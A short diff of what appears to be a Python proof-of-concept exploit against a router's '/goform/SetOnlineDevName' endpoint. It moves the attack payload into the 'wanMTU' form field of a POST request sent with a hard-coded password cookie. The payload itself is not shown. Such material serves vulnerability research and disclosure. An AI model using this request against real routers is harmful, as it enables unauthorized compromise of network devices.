@@ -42,8 +42,8 @@ url = "http://192.168.87.135/goform/SetOnlineDevName"
 cookie = {"Cookie":"password=12345"}
 
 data = {"SET": "erger",
-    "wanMTU": "m",
-    "wanSpeed": payload,
+    "wanMTU": payload,
+    "wanSpeed": "aa",
     "wanSpeed2": "300",
     "cloneType": "t",
     "cloneType2": "tt",
@@ -62,4 +62,5 @@ response = requests.post(url, cookies=cookie, data=data)
 print(response.text)
 
 ```
+
 
